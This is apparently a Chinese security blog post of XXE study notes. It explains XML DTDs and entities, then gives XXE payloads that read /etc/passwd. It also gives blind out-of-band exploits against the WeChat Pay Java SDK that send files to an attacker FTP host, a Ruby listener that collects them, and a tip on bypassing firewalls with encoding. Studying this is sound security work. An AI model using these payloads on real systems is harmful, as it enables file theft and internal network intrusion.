@@ -1,0 +1,485 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>XXE学习笔记 | 😊#</title>
+  <meta name="author" content="JKme">
+  
+  <meta name="description" content="XML基础：
+XML文档结构：
+XML声明
+&amp;lt;?xml version&amp;#x3D;&amp;quot;1.0&amp;quot;?&amp;gt;
+
+DTD文档类型定义
+&amp;lt;!DOCTYPE note [  &amp;lt;!--定义此文档是 note 类型的文档--&amp;gt;
+&amp;lt;!ELEMENT note (to,from,heading,body)&amp;gt;  &amp;lt;!--定义note元素有四个元素--&amp;gt;
+&amp;lt;!ELEMENT to (#PCDATA)&amp;gt;     &amp;lt;!--定义to元素为”#PCDATA”类型--&amp;gt;
+&amp;lt;!ELEMENT from (#PCDATA)&amp;gt;   &amp;lt;!--定义from元素为”#PCDATA”类型--&amp;gt;
+&amp;lt;!ELEMENT head (#PCDATA)&amp;gt;   &amp;lt;!--定义head元素为”#PCDATA”类型--&amp;gt;
+&amp;lt;!ELEMENT body (#PCDATA)&amp;gt;   &amp;lt;!--定义body元素为”#PCDATA”类型--&amp;gt;
+]]]
+
+
+文档元素
+&amp;lt;note&amp;gt;
+&amp;lt;to&amp;gt;Dave&amp;lt;&amp;#x2F;to&amp;gt;
+&amp;lt;from&amp;gt;Tom&amp;lt;&amp;#x2F;from&amp;gt;
+&amp;lt;head&amp;gt;Reminder&amp;lt;&amp;#x2F;head&amp;gt;
+&amp;lt;body&amp;gt;You are a good man&amp;lt;&amp;#x2F;body&amp;gt;
+&amp;lt;&amp;#x2F;note&amp;gt;
+
+
+DTD(document type definitions)可以定义一个合法的XML文档构建模块，可以被成行声明于XML文档中，也可以作为一个外部引用。
+内部声明DTD：
+
+&amp;lt;!DOCTYPE 跟元素 [元素声明］&amp;gt;
+
+引用外部DTD:
+
+&amp;lt;!DOCTYPE 根元素  SYSTEM &amp;quot;文件名&amp;quot;&amp;gt;
+
+DTD文档中很多关键字如下: 
+
+DOCTYPE(DTD的声明）
+ENTITY （实体的声明）
+SYSTEM、PUBLIC （外部资源申请） 
+
+###实体
+实体可以理解为变量，必须在DTD定义声明，可以在文档中的其它位置引用该变量的值。实体按类型主要分以下四种:
+
+内置实体（Built-in entities)
+字符实体（Character entities)
+通用实体（General entities）
+参数实体 (Parameter entities）"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="XXE学习笔记"/>
+  <meta property="og:site_name" content="😊#"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
+    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<!--   <script src="/js/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="😊#" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">😊#</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project" title="All the categories.">
+			  <i class=""></i>Projects
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> XXE学习笔记</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p>XML基础：</p>
+<p>XML文档结构：</p>
+<pre class="line-numbers language-none"><code class="language-none">XML声明
+&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
+
+DTD文档类型定义
+&lt;!DOCTYPE note [  &lt;!--定义此文档是 note 类型的文档--&gt;
+&lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--定义note元素有四个元素--&gt;
+&lt;!ELEMENT to (#PCDATA)&gt;     &lt;!--定义to元素为”#PCDATA”类型--&gt;
+&lt;!ELEMENT from (#PCDATA)&gt;   &lt;!--定义from元素为”#PCDATA”类型--&gt;
+&lt;!ELEMENT head (#PCDATA)&gt;   &lt;!--定义head元素为”#PCDATA”类型--&gt;
+&lt;!ELEMENT body (#PCDATA)&gt;   &lt;!--定义body元素为”#PCDATA”类型--&gt;
+]]]
+
+
+文档元素
+&lt;note&gt;
+&lt;to&gt;Dave&lt;&#x2F;to&gt;
+&lt;from&gt;Tom&lt;&#x2F;from&gt;
+&lt;head&gt;Reminder&lt;&#x2F;head&gt;
+&lt;body&gt;You are a good man&lt;&#x2F;body&gt;
+&lt;&#x2F;note&gt;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>DTD(document type definitions)可以定义一个合法的XML文档构建模块，可以被成行声明于XML文档中，也可以作为一个外部引用。</p>
+<pre class="line-numbers language-none"><code class="language-none">内部声明DTD：
+
+&lt;!DOCTYPE 跟元素 [元素声明］&gt;
+
+引用外部DTD:
+
+&lt;!DOCTYPE 根元素  SYSTEM &quot;文件名&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>DTD文档中很多关键字如下: </p>
+<ul>
+<li>DOCTYPE(DTD的声明）</li>
+<li>ENTITY （实体的声明）</li>
+<li>SYSTEM、PUBLIC （外部资源申请） </li>
+</ul>
+<p>###实体</p>
+<p>实体可以理解为变量，必须在DTD定义声明，可以在文档中的其它位置引用该变量的值。<br>实体按类型主要分以下四种:</p>
+<ul>
+<li>内置实体（Built-in entities)</li>
+<li>字符实体（Character entities)</li>
+<li>通用实体（General entities）</li>
+<li>参数实体 (Parameter entities）</li>
+</ul>
+<p>实体根据引用方式，可以分为内部实体和外部实体。例子：</p>
+<pre class="line-numbers language-none"><code class="language-none">内部实体：
+&lt;!ENTITY entity_name &quot;entity_value&quot;&gt;
+
+entity_name is the name of entity followed by its value within the double quotes or single quote.
+
+entity_value holds the value for the entity name
+
+外部实体：
+&lt;!ENTITY name SYSTEM &quot;URI&#x2F;URL&quot;&gt;
+
+name is the name of entity.
+SYSTEM is the keyword.
+URI&#x2F;URL is the address of the external source enclosed within the double or single quotes.
+
+外部实体声明的时候可以有两种：SYSTEM和PUBLIC
+
+&lt;!DOCTYPE name SYSTEM &quot;address.dtd&quot; [...]&gt;
+&lt;!DOCTYPE name PUBLIC &quot;-&#x2F;&#x2F;Beginning XML&#x2F;&#x2F;DTD Address Example&#x2F;&#x2F;EN&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h3><p>参数实体（Parameter entities）语法这样：</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY % ename &quot;entity_value&quot;&gt;
+
+entity_value is any character that is not an &#39;&amp;&#39;, &#39;%&#39; or &#39; &quot; &#39;.
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;
+&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>是用%实体名称声明，引用的时候也是％实体名称，其它实体（内置实体，字符实体，通用实体）直接用实体名声声明，引用的时候用&amp;。</p>
+<p>参数实体只能在DTD中声明，DTD中引用，其它实体只能在DTD中声明，可以在xml文档中引用。</p>
+<h3 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h3><pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h3><pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<h3 id="参数实体-外部实体"><a href="#参数实体-外部实体" class="headerlink" title="参数实体+外部实体"></a>参数实体+外部实体</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE a [
+    &lt;!ENTITY % name SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;
+    %name;
+]&gt;
+注意：%name（参数实体）是在DTD中被引用的，而&amp;name（其余实体）是在xml文档中被引用的。
+
+&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
+
+&lt;!DOCTYPE foo [
+
+&lt;!ELEMENT methodName ANY &gt;
+
+&lt;!ENTITY zozhang SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; &gt;]&gt;
+
+&lt;methodCall&gt;
+
+&lt;methodName&gt;&amp;zozhang;&lt;&#x2F;methodName&gt;
+
+&lt;&#x2F;methodCall&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>由于XXE漏洞主要引用了DTD的外部实体导致的漏洞，重点看下能引用哪些类型的外部实体，外部实体</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>语法引用外部实体，而非内部实体，所以URL中能写类型如下：</p>
+<p><img src="https://thief.one/upload_image/20170620/1.png"></p>
+<p>XXE漏洞（XML External Entity Injection)即xml外部实体注入漏洞，xxe漏洞发生在应用程序解析xml输入时，没有禁用外部实体的加载，导致可以加载恶意外部文件，造成文件读取，命令执行，内网扫描等危害。xxe的触发点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可以上传恶意xml文件。</p>
+<p><a target="_blank" rel="noopener" href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet">https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet</a></p>
+<blockquote>
+<p>Note: Per: <a target="_blank" rel="noopener" href="https://mail.gnome.org/archives/xml/2012-October/msg00045.html">https://mail.gnome.org/archives/xml/2012-October/msg00045.html</a>, starting with libxml2 version 2.9, XXE has been disabled by default as committed by the following patch: <a target="_blank" rel="noopener" href="http://git.gnome.org/browse/libxml2/commit/?id=4629ee02ac649c27f9c0cf98ba017c6b5526070f">http://git.gnome.org/browse/libxml2/commit/?id=4629ee02ac649c27f9c0cf98ba017c6b5526070f</a>. </p>
+</blockquote>
+<p>所以：从libxml2.91版本开始，默认不解析外部实体。</p>
+<p><a target="_blank" rel="noopener" href="http://wooyun.jozxing.cc/static/bugs/wooyun-2014-059783.html">http://wooyun.jozxing.cc/static/bugs/wooyun-2014-059783.html</a> 百度修复xxe漏洞外部实体的绕过</p>
+<p>2018.7.4号更新:</p>
+<p>wxpay的java SDK_v3版本出现xxe漏洞，EXP如下:</p>
+<h2 id="0x01-解法"><a href="#0x01-解法" class="headerlink" title="0x01 解法"></a>0x01 解法</h2><pre class="line-numbers language-none"><code class="language-none">Request的Body:
+
+&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;x.x.x.x:8000&#x2F;data.xml&quot;&gt;%remote;]&gt;&lt;root&#x2F;&gt;
+
+
+data.xml:
+
+&lt;!ENTITY % attack SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;home&#x2F;&quot;&gt;
+&lt;!ENTITY % shell &quot;&lt;!ENTITY &amp;#37; upload SYSTEM &#39;ftp:&#x2F;&#x2F;x.x.x.x:33&#x2F;%attack;
+&#39;&gt;&quot;&gt;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>另外需要服务器开一个ftp:</p>
+<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">ftp<span class="token punctuation">.</span>rb
+
+<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'socket'</span></span>
+server <span class="token operator">=</span> <span class="token class-name">TCPServer</span><span class="token punctuation">.</span><span class="token keyword">new</span> <span class="token number">33</span> 
+loop <span class="token keyword">do</span>
+  <span class="token builtin">Thread</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span>server<span class="token punctuation">.</span>accept<span class="token punctuation">)</span> <span class="token keyword">do</span> <span class="token operator">|</span>client<span class="token operator">|</span>
+    puts <span class="token string-literal"><span class="token string">"New client connected"</span></span>
+    data <span class="token operator">=</span> <span class="token string-literal"><span class="token string">""</span></span>
+    client<span class="token punctuation">.</span>puts<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"220 xxe-ftp-server"</span></span><span class="token punctuation">)</span>
+    loop <span class="token punctuation">&#123;</span>
+        req <span class="token operator">=</span> client<span class="token punctuation">.</span>gets<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        puts <span class="token string-literal"><span class="token string">"&lt; "</span></span><span class="token operator">+</span>req
+        <span class="token keyword">if</span> req<span class="token punctuation">.</span><span class="token keyword">include</span><span class="token operator">?</span> <span class="token string-literal"><span class="token string">"USER"</span></span>
+            client<span class="token punctuation">.</span>puts<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"331 password please - version check"</span></span><span class="token punctuation">)</span>
+        <span class="token keyword">else</span>
+           <span class="token comment">#puts "> 230 more data please!"</span>
+            client<span class="token punctuation">.</span>puts<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"230 more data please!"</span></span><span class="token punctuation">)</span>
+        <span class="token keyword">end</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token keyword">end</span>
+<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="0x02-解法"><a href="#0x02-解法" class="headerlink" title="0x02 解法"></a>0x02 解法</h2><p>body:</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE data [
+&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;home&#x2F;&quot;&gt;
+&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;x.x.x.x:8000&#x2F;data.xml&quot;&gt;
+%dtd; %all;
+]&gt;
+&lt;value&gt;&amp;send;&lt;&#x2F;value&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>服务器的xml:</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY % all &quot;&lt;!ENTITY  send SYSTEM &#39;ftp:&#x2F;&#x2F;x.x.x.x:33&#x2F;%attack;
+&#39;&gt;&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>一个是参数实体，一个是其他实体。在服务区开启<code>ruby ftp.rb</code>监听33端口，就可以等待数据过来了。因为这次的xxe属于blind xxe，在java里面只能使用ftp+file来读取文件。<a target="_blank" rel="noopener" href="https://joychou.org/java/java-xxe-vulnerability.html">https://joychou.org/java/java-xxe-vulnerability.html</a> 具体情况可以看这个文章。</p>
+<p>这种没有回显的情况下，使用<code>ftp + file</code>读取文件，<code>http</code>来探测内网开启的端口</p>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过:"></a>绕过:</h3><p>如果存在防火墙可以使用编码绕过关键词:<a target="_blank" rel="noopener" href="https://2017.zeronights.org/wp-content/uploads/materials/ZN17_yarbabin_XXE_Jedi_Babin.pdf">https://2017.zeronights.org/wp-content/uploads/materials/ZN17_yarbabin_XXE_Jedi_Babin.pdf</a>，比如UTF-7</p>
+<p>参考链接:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://joychou.org/java/java-xxe-vulnerability.html">https://joychou.org/java/java-xxe-vulnerability.html</a></li>
+<li><a target="_blank" rel="noopener" href="http://blog.leanote.com/post/xuxi/XXE%E6%80%BB%E7%BB%93">http://blog.leanote.com/post/xuxi/XXE%E6%80%BB%E7%BB%93</a></li>
+<li><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Java%E7%89%88%E6%9C%AC%E6%AD%B7%E5%8F%B2#Java_7_%E6%9B%B4%E6%96%B0">https://zh.wikipedia.org/wiki/Java%E7%89%88%E6%9C%AC%E6%AD%B7%E5%8F%B2#Java_7_%E6%9B%B4%E6%96%B0</a></li>
+</ul>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2018/02/02/xxe.html" class="leancloud-visitors view" data-flag-title="XXE学习笔记">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2018/02/03/termite-socks.html" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2017/12/12/bypass-disabled-functions.html" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2018-02-02 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Pentest/">Pentest<span>42</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93"><span class="toc-article-text">参数实体</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%86%85%E9%83%A8%E5%AE%9E%E4%BD%93"><span class="toc-article-text">内部实体</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93"><span class="toc-article-text">外部实体</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93-%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93"><span class="toc-article-text">参数实体+外部实体</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x01-%E8%A7%A3%E6%B3%95"><span class="toc-article-text">0x01 解法</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x02-%E8%A7%A3%E6%B3%95"><span class="toc-article-text">0x02 解法</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-article-text">绕过:</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2022 JKme's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
